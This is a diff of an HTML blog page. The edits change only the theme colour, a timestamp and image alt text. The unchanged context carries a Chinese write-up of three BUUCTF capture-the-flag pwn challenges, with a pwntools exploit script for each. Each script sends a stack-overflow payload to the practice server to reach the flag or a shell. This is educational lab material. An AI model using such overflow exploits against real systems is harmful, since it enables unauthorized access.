@@ -12,7 +12,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <meta name="theme-color" content="#2f4154">
+  <meta name="theme-color" content="#33cc66">
   <meta name="author" content="夏白">
   <meta name="keywords" content="">
   
@@ -35,7 +35,7 @@
 <meta property="og:image" content="http://example.com/.com//10.png">
 <meta property="og:image" content="http://example.com/.com//11.png">
 <meta property="article:published_time" content="2023-01-09T08:19:59.000Z">
-<meta property="article:modified_time" content="2023-01-09T11:13:58.414Z">
+<meta property="article:modified_time" content="2023-01-10T08:11:59.917Z">
 <meta property="article:author" content="夏白">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/.com//1.png">
@@ -286,35 +286,35 @@
               <div class="markdown-body">
                 
                 <h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>拿到题不管三七二十一先check一下，64位文件，无保护:</p>
-<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="示例图片"></p>
+<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="图片1"></p>
 <p>丢进ida64里，看汇编还是有点费劲，选择F5看伪C代码：</p>
-<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="示例图片"></p>
+<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="图片2"></p>
 <p>很容易看到第11行的gets，很明显的栈溢出。shift+f12又发现了cat flag.txt：</p>
-<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="示例图片"></p>
+<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="图片3"></p>
 <p>那局势就很明了了，标准的ret2text，双击进去，Ctrl+x发现在sub_40060D中调用了此字符串：</p>
-<p><img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="示例图片"></p>
+<p><img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="图片4"></p>
 <p>回到main函数看一下v5的长度：</p>
-<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="示例图片"></p>
+<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="图片5"></p>
 <p>万事俱全,exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28016</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x40060D</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 
 
 <h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>同样check,64位，只开了NX保护:</p>
-<p><img src="/.com//6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/.com//6.png" srcset="/img/loading.gif" lazyload alt="图片6"></p>
 <p>主函数平平无奇，调用了一个func()函数，进去看看:</p>
-<p><img src="/.com//7.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/.com//8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/.com//7.png" srcset="/img/loading.gif" lazyload alt="图片7"></p>
+<p><img src="/.com//8.png" srcset="/img/loading.gif" lazyload alt="图片8"></p>
 <p>代码审计，发现当v2&#x3D;11.28125时能拿到flag。我们用gets输入的是v1，只需要控制v1的长度，是v1溢出给v2填充为11.28125即可。不过要注意，这里的11.28125需要是16进制的。</p>
 <p>附上exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29450</span>) <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>check，32位，只开了NX保护:</p>
-<p><img src="/.com//9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/.com//9.png" srcset="/img/loading.gif" lazyload alt="图片9"></p>
 <p>可以看到第12行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，代码审计后发现，会把字符’I’变成’you’：</p>
-<p><img src="/.com//10.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/.com//10.png" srcset="/img/loading.gif" lazyload alt="图片10"></p>
 <p>shell地址也直接给了我们:</p>
-<p><img src="/.com//11.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/.com//11.png" srcset="/img/loading.gif" lazyload alt="图片11"></p>
 <p>附上exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26413</span>)<br><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span> * <span class="hljs-number">21</span> + <span class="hljs-string">b&#x27;q&#x27;</span> + p32(<span class="hljs-number">0x8048f0D</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
